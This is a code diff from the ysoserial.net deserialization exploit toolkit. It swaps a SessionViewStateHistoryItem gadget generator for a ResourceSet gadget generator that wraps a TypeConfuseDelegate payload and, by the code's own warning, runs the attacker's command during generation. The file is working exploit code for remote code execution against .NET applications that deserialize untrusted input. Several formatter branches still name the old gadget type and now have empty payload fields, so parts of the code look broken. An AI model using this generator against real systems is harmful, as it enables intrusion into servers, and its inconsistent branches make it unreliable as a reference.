@@ -1,29 +1,28 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Reflection;
-using System.Runtime.Serialization;
+using System.IO;
+using System.Resources;
 using System.Text;
-using System.Text.RegularExpressions;
 using ysoserial.Helpers;
 
 namespace ysoserial.Generators
 {
-    class SessionViewStateHistoryItemGenerator : GenericGenerator
+    class ResourceSetGenerator : GenericGenerator
     {
         public override string Description()
         {
-            return "SessionViewStateHistoryItem gadget";
+            return "ResourceSet gadget (WARNING: your command will be executed at least once during payload generation)";
             // Although it looks similar to WindowsIdentityGenerator but "actor" does not work in this context 
         }
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "NetDataContractSerializer", "SoapFormatter", "LosFormatter", "Json.Net" , "DataContractSerializer" };
+            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "NetDataContractSerializer", "SoapFormatter", "LosFormatter", "Json.Net", "DataContractSerializer" };
         }
 
         public override string Name()
         {
-            return "SessionViewStateHistoryItem";
+            return "ResourceSet";
         }
 
         public override string Finders()
@@ -36,51 +35,41 @@ namespace ysoserial.Generators
             return new List<string> { GadgetTypes.BridgeAndDerived };
         }
 
-        [Serializable]
-        public class SessionViewStateHistoryItemMarshal : ISerializable
-        {
-            public SessionViewStateHistoryItemMarshal(string strB64LosFormatterPayload)
-            {
-                B64LosFormatterPayload = strB64LosFormatterPayload;
-            }
-
-            private string B64LosFormatterPayload { get; }
-
-            public void GetObjectData(SerializationInfo info, StreamingContext context)
-            {
-                Type myType_SessionViewState = Type.GetType("System.Web.UI.MobileControls.SessionViewState, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
-                Type[] nestedTypes = myType_SessionViewState.GetNestedTypes(BindingFlags.NonPublic | BindingFlags.Instance);
-                info.SetType(nestedTypes[0]); // to reach the SessionViewStateHistoryItem class (private)
-                info.AddValue("s", B64LosFormatterPayload);
-
-            }
-        }
-
-        private string GetB64SessionToken(string b64encoded)
-        {
-            var obj = new SessionViewStateHistoryItemMarshal(b64encoded);
-            string ndc_serialized = SerializersHelper.NetDataContractSerializer_serialize(obj);
-            Regex b64SessionTokenPattern = new Regex(@"\<s[^>]+>([^<]+)");
-            Match b64SessionTokenMatch = b64SessionTokenPattern.Match(ndc_serialized);
-            return b64SessionTokenMatch.Groups[1].Value;
-        }
-
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            Generator generator = new TextFormattingRunPropertiesGenerator();
-            string losFormatterText = Encoding.UTF8.GetString((byte[])generator.GenerateWithNoTest("LosFormatter", inputArgs));
+            string resxPayload = Plugins.ResxPlugin.GetPayload("binaryformatter", inputArgs);
+            MemoryStream ms = new MemoryStream(Encoding.ASCII.GetBytes(resxPayload));
 
+            // TextFormattingRunPropertiesGenerator is the preferred method due to its short length. However, we need to insert it manually into a serialized object as ResourceSet cannot tolerate it 
+            // TODO: surgical insertion!
+            // object generatedPayload = TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(tempInputArgs);
+
+            object generatedPayload = TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);
+
+            using (ResourceWriter rw = new ResourceWriter(@".\ResourceSetGenerator.resources"))
+            {
+                rw.AddResource("", generatedPayload);
+                rw.Generate();
+                rw.Close();
+            }
+
+            ResourceReader myResourceReader = new ResourceReader(@".\ResourceSetGenerator.resources");
+
+            // Payload will be executed once here which is annoying but without surgical insertion or something to parse binaryformatter objects, it is quite hard to prevent this
+            ResourceSet myResourceSet = new ResourceSet(@".\ResourceSetGenerator.resources");
+            
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
-                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase))
+                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase)
+                || formatter.Equals("netdatacontractserializer", StringComparison.OrdinalIgnoreCase)
+                || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
             {
-                var obj = new SessionViewStateHistoryItemMarshal(losFormatterText);
-                return Serialize(obj, formatter, inputArgs);
+                return Serialize(myResourceSet, formatter, inputArgs);
             }
             else if (formatter.ToLower().Equals("json.net"))
             {
 
-                string payload = "{'$type': 'System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a', 's':'" + GetB64SessionToken(losFormatterText) + "'}";
+                string payload = "{'$type': 'System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a', 's':''}";
 
                 if (inputArgs.Minify)
                 {
@@ -107,7 +96,7 @@ namespace ysoserial.Generators
             {
 
                 string payload = $@"<root type=""System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""><SessionViewState.SessionViewStateHistoryItem xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns=""http://schemas.datacontract.org/2004/07/System.Web.UI.MobileControls"">
-  <s i:type=""x:string"" xmlns="""">{GetB64SessionToken(losFormatterText)}</s>
+  <s i:type=""x:string"" xmlns=""""></s>
 </SessionViewState.SessionViewStateHistoryItem></root>";
 
                 if (inputArgs.Minify)
@@ -131,7 +120,7 @@ namespace ysoserial.Generators
             {
 
                 string payload = $@"<root><w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" z:Id=""1"" z:Type=""System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem"" z:Assembly=""System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
-  <s z:Type=""System.String"" z:Assembly=""0"" xmlns="""">{GetB64SessionToken(losFormatterText)}</s>
+  <s z:Type=""System.String"" z:Assembly=""0"" xmlns=""""></s>
 </w></root>";
 
                 if (inputArgs.Minify)
@@ -157,7 +146,7 @@ namespace ysoserial.Generators
                 string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
 <SOAP-ENV:Body>
 <a1:SessionViewState_x002B_SessionViewStateHistoryItem id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Web.UI.MobileControls/System.Web.Mobile%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db03f5f7f11d50a3a"">
-<s>{GetB64SessionToken(losFormatterText)}</s>
+<s></s>
 </a1:SessionViewState_x002B_SessionViewStateHistoryItem>
 </SOAP-ENV:Body>
 </SOAP-ENV:Envelope>
